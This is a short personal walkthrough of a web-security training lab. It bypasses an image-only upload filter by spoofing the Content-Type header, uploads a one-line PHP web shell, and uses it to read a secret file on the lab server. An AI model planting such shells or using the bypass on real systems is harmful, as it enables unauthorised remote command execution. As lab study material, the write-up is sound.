# 2. Web shell upload via Content-Type restriction bypass

**Goal** : take RCE of server bypassing the Content-Type restriction and find the secret in /home/carlos/secret 

**Steps** : 

- 1st i login using weiner and peter credentials.
- then i upload a .png file to check where it uploaded
    - it upload successfully in /files/avatar directory.(dir found by opening image in a new tab)
- then i write a simple php backdoor code for RCE. and save this as a shell.php file

```php
<?php system($_GET['cmd']);?>
```

- then i upload it on the server, but it says
    - “Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.”
- then i make another request by uploading the shell.php and change the Content type : application/x-php    —> image/jpeg      , now it uploaded successfully, we bypassed the restriction 😈

### Then :

- open that shell.php in a new tab, it opens like this

```php
https://0a420007047dc58f802cf338004a008d.web-security-academy.net/files/avatars/shell.php
```

- then, executing commands to find the secret :

```php
https://0a420007047dc58f802cf338004a008d.web-security-academy.net/files/avatars/shell.php?cmd=cat /home/carlos/secret

O/P→ LcXWggWFKQeosd4wGNDe5zDP1drs5TDD
```

LAB SOLVED. 😎